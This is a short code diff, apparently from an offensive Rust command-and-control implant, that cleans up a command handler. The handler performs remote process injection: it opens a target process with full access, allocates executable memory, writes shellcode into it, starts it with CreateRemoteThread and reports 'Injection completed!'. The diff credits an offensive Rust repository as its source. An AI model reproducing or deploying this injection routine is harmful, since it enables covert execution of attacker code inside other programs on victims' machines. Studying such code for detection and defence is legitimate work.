@@ -5,6 +5,7 @@ use std::error::Error;
 use std::result::Result;
 use std::io::copy;
 use std::fmt;
+use std::ptr;
 use std::path::Path;
 use std::fs::{write, File};
 use std::env::{set_current_dir, current_dir};
@@ -167,11 +168,11 @@ impl NotionCommand {
                         // Big thanks to trickster0
                         // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                         unsafe {
-                            let mut h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                            let mut addr = kernel32::VirtualAllocEx(h,ptr::null_mut(),shellcode.len() as u64,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                            let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
+                            let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                             let mut n = 0;
                             kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                            let mut hThread = kernel32::CreateRemoteThread(h,ptr::null_mut(),0,Some(std::mem::transmute(addr)), ptr::null_mut(), 0,ptr::null_mut());
+                            let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                             kernel32::CloseHandle(h);
                         }
                         return Ok("Injection completed!".to_string());
